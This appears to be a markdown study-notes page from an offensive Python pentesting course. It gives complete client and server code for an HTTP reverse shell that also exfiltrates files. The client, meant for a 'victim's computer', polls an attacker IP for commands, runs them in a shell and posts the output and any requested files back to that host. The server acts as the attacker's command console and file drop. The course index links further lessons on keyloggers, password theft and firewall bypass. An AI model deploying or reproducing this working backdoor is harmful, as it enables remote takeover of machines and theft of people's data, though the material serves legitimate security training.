---
title: Coding a data exfiltration script for a http shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Coding a data exfiltration script for a http shell

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Client side

To be run on victim's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import requests
import os
import subprocess
import time

while True:

    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break


# Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
# notify our attacker that we are unable to find the file, but if the file is there then we will :-
# 1.Append /store in the URL
# 2.Add a dictionary key called 'file'
# 3.requests library use POST method called "multipart/form-data" when submitting files

#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output. Please see the server script for more details on how we can use these points to get the file


    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path): # check if the file is there
            url = "http://192.168.0.152:8080/store" # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)


```

## Server side

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import http.server
import os, cgi

HOST_NAME = '10.0.2.15'
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        #Here we will use the points which we mentioned in the Client side, as a start if the "/store" was in the URL then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we will pass the POST parameters to FieldStorage class, the "fs" object contains the returned values from FieldStorage in dictionary fashion.

        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'
                with open('/home/kali/place_holder.txt', 'wb') as o: # create a file holder called 'placer_holder.txt' and write the received file into this 'place_holder.txt'. After the operation you need to rename this file to the original one, so the extention gets recognized. 
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpd.server_close()


```